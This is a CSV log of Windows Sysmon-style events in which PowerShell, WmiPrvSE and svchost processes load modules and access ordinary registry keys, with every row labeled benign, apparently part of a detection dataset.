timestamp,eventID,image,commandLine,parentImage,processId,filePath,protocol,destinationIp,user,severity,stage,label
2022-05-13T08:54:09.4210000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4260000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4260000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\Tracing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4310000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4360000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.4360000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:09.4360000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\Windows\TenantRestrictions\Payload,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\Windows\TenantRestrictions\Payload,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\Windows\TenantRestrictions\Payload,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4410000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4460000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4460000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.4710000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4530000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\Software Publishing,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\Certificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CRLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKU\S-1-5-19\SOFTWARE\Policies\Microsoft\SystemCertificates\Disallowed\CTLs,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\EnterpriseCertificates,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4680000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4830000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKCR,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4880000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\Wbem,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5080000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\SOFTWARE\Microsoft\Wbem,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5130000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5240000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5530000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5530000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5530000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5580000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5630000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5630000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5680000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5730000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.5930000Z,7,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:09.3900000Z,3,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,tcp,192.168.3.5,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.6380000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6430000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6480000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6530000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6580000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:10.6580000Z,10,,,,,,,,,0,benign,benign
2022-05-13T08:54:10.6630000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6630000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6630000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6680000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6680000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6840000Z,12,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.6840000Z,12,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7230000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.7230000Z,12,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,HKLM\System\CurrentControlSet\Services\Tcpip\Parameters,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.7380000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7430000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7430000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7480000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7480000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7530000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7530000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7530000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7580000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7580000Z,12,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,HKLM\System\CurrentControlSet\Control\SecurityProviders\SCHANNEL,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.7980000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8030000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8030000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8030000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8130000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8180000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8180000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8230000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8280000Z,18,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8330000Z,7,C:\Windows\System32\wbem\WmiPrvSE.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8330000Z,18,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:10.8330000Z,18,C:\Windows\system32\wbem\wmiprvse.exe,,,6656,,,,NT AUTHORITY\NETWORK SERVICE,0,benign,benign
2022-05-13T08:54:11.6530000Z,12,C:\Windows\system32\svchost.exe,,,3012,HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
2022-05-13T08:54:10.4900000Z,22,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,2084,,,,NT AUTHORITY\LOCAL SERVICE,0,benign,benign
